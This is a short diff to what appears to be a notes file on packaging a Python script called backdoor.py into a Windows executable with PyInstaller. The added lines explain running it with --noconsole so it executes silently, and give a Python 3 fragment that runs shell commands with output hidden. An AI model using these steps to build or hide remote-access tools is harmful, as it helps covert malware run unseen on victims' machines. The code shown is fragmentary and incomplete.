@@ -16,4 +16,16 @@ c:\python27\scripts\pyinstaller.exe backdoor.py --onefile
 #pack all lib and support file in --onefile
 #it will create a binary executable of backdoor it will execute when double click with a visible backgroung execution
 
+To run silently:
 c:\python27\scripts\pyinstaller.exe backdoor.py --onefile --noconsole
+
+#import sys
+
+  try: 
+      ...
+       sys.exit()
+       
+For Python3:
+#def execute_system_command(self,command):
+    DEVNULL = open(os.devnull, 'wb')
+    return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
